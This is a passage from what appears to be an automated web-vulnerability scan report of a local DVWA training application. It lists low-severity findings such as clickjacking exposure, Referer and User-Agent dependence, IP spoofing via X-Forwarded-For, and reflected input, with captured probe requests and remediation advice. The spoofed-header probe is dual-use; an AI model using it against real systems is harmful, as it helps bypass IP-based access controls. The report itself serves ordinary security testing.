<div class="rr_div"><span>GET /dvwa/login.php<span class="HIGHLIGHT">/j481dq/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=2q0ln68gtr61d2jqvkb83ua2ct<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:03:56 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1415<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Developm<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/login.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp;&lt;/head&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/login.php/j481dq/dvwa/css/login.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=3ha01gppr0tpfoia3panjdu2tt<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:03:56 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1415<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Developm<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="13.3">13.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/005009a0_frameableresponsepotentialclickjacking">Frameable response (potential Clickjacking)</a></span>
<br><a class="PREVNEXT" href="#13.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#14.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/login.php</b></td>
</tr>
</table>
<h2>Issue description</h2>
<span class="TEXT"><p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
    <li><a href="https://portswigger.net/web-security/clickjacking">Web Security Academy: Clickjacking</a></li>
    <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/103.html">CAPEC-103: Clickjacking</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/login.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=lub2ldtl1n19g18t95thn5uipg<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:03:43 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1415<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Developm<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="14">14.&nbsp;http://localhost:7878/dvwa/phpinfo.php</span>
<br><a class="PREVNEXT" href="#13">Previous</a>
&nbsp;<a class="PREVNEXT" href="#15">Next</a>
<br>
<span class="BODH1" id="14.1">14.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400100_refererdependentresponse">Referer-dependent response</a></span>
<br><a class="PREVNEXT" href="#13.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#14.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/phpinfo.php</b></td>
</tr>
</table>
<h2>Issue description</h2>
<span class="TEXT"><p>Application responses may depend systematically on the presence or absence of the Referer header in requests. This behavior does not necessarily constitute a security vulnerability, and you should investigate the nature of and reason for the differential responses to determine whether a vulnerability is present.</p>
<p>Common explanations for Referer-dependent responses include: </p>
<ul><li>Referer-based access controls, where the application assumes that if you have arrived from one privileged location then you are authorized to access another privileged location. These controls can be trivially defeated by supplying an accepted Referer header in requests for the vulnerable function.</li><li>Attempts to prevent cross-site request forgery attacks by verifying that requests to perform privileged actions originated from within the application itself and not from some external location. Such defenses are often not robust, and can be bypassed by removing the Referer header entirely.</li>
<li>Delivery of Referer-tailored content, such as welcome messages to visitors from specific domains, search-engine optimization (SEO) techniques, and other ways of tailoring the user's experience. Such behaviors often have no security impact; however, unsafe processing of the Referer header may introduce vulnerabilities such as SQL injection and cross-site scripting. If parts of the document (such as META keywords) are updated based on search engine queries contained in the Referer header, then the application may be vulnerable to persistent code injection attacks, in which search terms are manipulated to cause malicious content to appear in responses served to other application users.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The Referer header is not a robust foundation on which to build access controls. Any such measures should be replaced with more secure alternatives that are not vulnerable to Referer spoofing.</p>
<p>If the contents of responses is updated based on Referer data, then the same defenses against malicious input should be employed here as for any other kinds of user-supplied data. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/213.html">CWE-213: Intentional Information Exposure</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/phpinfo.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=15qtci8c3dfjk6ta6hmf6r98ol<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br><span class="HIGHLIGHT">Referer: http://localhost:7878/dvwa/index.php</span><br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:39:33 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br>Content-Length: <span class="HIGHLIGHT">81992</span><br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;<br>&lt;style type="text/css"&gt;<br>body {background-color: #fff; co<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;http <span class="HIGHLIGHT">&lt;/td&gt;&lt;/tr&gt;<br>&lt;tr&gt;&lt;td class="e"&gt;CONTEXT_PREFIX &lt;/td&gt;&lt;td class="v"&gt;</span>&lt;i&gt;<br><b>...[SNIP]...</b><br>&lt;/th&gt;<span class="HIGHLIGHT">&lt;/tr&gt;<br>&lt;tr&gt;&lt;td class="e"&gt;HTTP Request &lt;/td&gt;&lt;td class="v"&gt;GET /dvwa/phpinfo.php HTTP/1.1 &lt;/td&gt;</span>&lt;/tr&gt;<br><b>...[SNIP]...</b><br>&lt;/th&gt;<span class="HIGHLIGHT">&lt;/tr&gt;<br>&lt;tr&gt;&lt;td class="e"&gt;$_COOKIE['security']&lt;/td&gt;&lt;td class="v"&gt;low&lt;/td&gt;</span>&lt;/tr&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/phpinfo.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=15qtci8c3dfjk6ta6hmf6r98ol<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:39:33 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br>Content-Length: <span class="HIGHLIGHT">81692</span><br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;<br>&lt;style type="text/css"&gt;<br>body {background-color: #fff; co<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="14.2">14.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400110_spoofableclientipaddress">Spoofable client IP address</a></span>
<br><a class="PREVNEXT" href="#14.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#14.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/phpinfo.php</b></td>
</tr>
</table>
<h2>Issue description</h2>
<span class="TEXT"><p>
If an application trusts an HTTP request header like X-Forwarded-For to accurately specify the remote IP address of the connecting client, then malicious clients can spoof their IP address. This behavior does not necessarily constitute a security vulnerability, however some applications use client IP addresses to enforce access controls and rate limits. For example, an application might expose administrative functionality only to clients connecting from the local IP address of the server, or allow a certain number of failed login attempts from each unique IP address.
Consider reviewing relevant functionality to determine whether this might be the case. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>HTTP request headers such as X-Forwarded-For, True-Client-IP, and X-Real-IP are not a robust foundation on which to build any security measures, such as access controls. Any such measures should be replaced with more secure alternatives that are not vulnerable to spoofing.</p>
<p>If the platform application server returns incorrect information about the client's IP address due to the presence of any particular HTTP request header, then the server may need to be reconfigured, or an alternative method of identifying clients should be used. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/phpinfo.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=15qtci8c3dfjk6ta6hmf6r98ol<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:39:35 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br>Content-Length: <span class="HIGHLIGHT">81992</span><br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;<br>&lt;style type="text/css"&gt;<br>body {background-color: #fff; co<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/phpinfo.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=15qtci8c3dfjk6ta6hmf6r98ol<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><span class="HIGHLIGHT">X-Forwarded-For: 127.0.0.1</span><br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:39:35 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br>Content-Length: <span class="HIGHLIGHT">82234</span><br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;<br>&lt;style type="text/css"&gt;<br>body {background-color: #fff; co<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;http <span class="HIGHLIGHT">&lt;/td&gt;&lt;/tr&gt;<br>&lt;tr&gt;&lt;td class="e"&gt;CONTEXT_PREFIX &lt;/td&gt;&lt;td class="v"&gt;</span>&lt;i&gt;<br><b>...[SNIP]...</b><br>&lt;/th&gt;<span class="HIGHLIGHT">&lt;/tr&gt;<br>&lt;tr&gt;&lt;td class="e"&gt;HTTP Request &lt;/td&gt;&lt;td class="v"&gt;GET /dvwa/phpinfo.php HTTP/1.1 &lt;/td&gt;</span>&lt;/tr&gt;<br><b>...[SNIP]...</b><br>&lt;/th&gt;<span class="HIGHLIGHT">&lt;/tr&gt;<br>&lt;tr&gt;&lt;td class="e"&gt;$_COOKIE['security']&lt;/td&gt;&lt;td class="v"&gt;low&lt;/td&gt;</span>&lt;/tr&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="14.3">14.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400120_useragentdependentresponse">User agent-dependent response</a></span>
<br><a class="PREVNEXT" href="#14.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#14.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/phpinfo.php</b></td>
</tr>
</table>
<h2>Issue description</h2>
<span class="TEXT"><p>Application responses may depend systematically on the value of the User-Agent header in requests. This behavior does not itself constitute a security vulnerability, but may point towards additional attack surface within the application, which may contain vulnerabilities.</p>
<p>This behavior often arises because applications provide different user interfaces for desktop and mobile users. Mobile interfaces have often been less thoroughly tested for vulnerabilities such as cross-site scripting, and often have simpler authentication and session handling mechanisms that may contain problems that are not present in the full interface.</p>
<p>To review the interface provided by the alternate User-Agent header, you can configure a match/replace rule in Burp Proxy to modify the User-Agent header in all requests, and then browse the application in the normal way using your normal browser. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/phpinfo.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=bdhcgicbsi6f2np241k4p9o4vd<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br><span class="HIGHLIGHT">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36</span><br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:01 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br>Content-Length: <span class="HIGHLIGHT">81992</span><br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;<br>&lt;style type="text/css"&gt;<br>body {background-color: #fff; co<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/phpinfo.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=15qtci8c3dfjk6ta6hmf6r98ol<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br><span class="HIGHLIGHT">User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3</span><br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:39:34 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br>Content-Length: <span class="HIGHLIGHT">82052</span><br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;<br>&lt;style type="text/css"&gt;<br>body {background-color: #fff; co<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="14.4">14.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#14.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#15.1">Next</a>
<br>
<br><span class="TEXT">There are 4 instances of this issue:
<ul>
<li><a href="#14.4.1">/dvwa/phpinfo.php [Referer HTTP header]</a></li>
<li><a href="#14.4.2">/dvwa/phpinfo.php [User-Agent HTTP header]</a></li>
<li><a href="#14.4.3">/dvwa/phpinfo.php [name of an arbitrarily supplied URL parameter]</a></li>
<li><a href="#14.4.4">/dvwa/phpinfo.php [security cookie]</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="14.4.1">14.4.1.&nbsp;http://localhost:7878/dvwa/phpinfo.php [Referer HTTP header]</span>
<br><a class="PREVNEXT" href="#14.4.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/phpinfo.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>Referer</b> HTTP header is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/phpinfo.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=15qtci8c3dfjk6ta6hmf6r98ol<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<span class="HIGHLIGHT">5g6c2620wg</span><br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
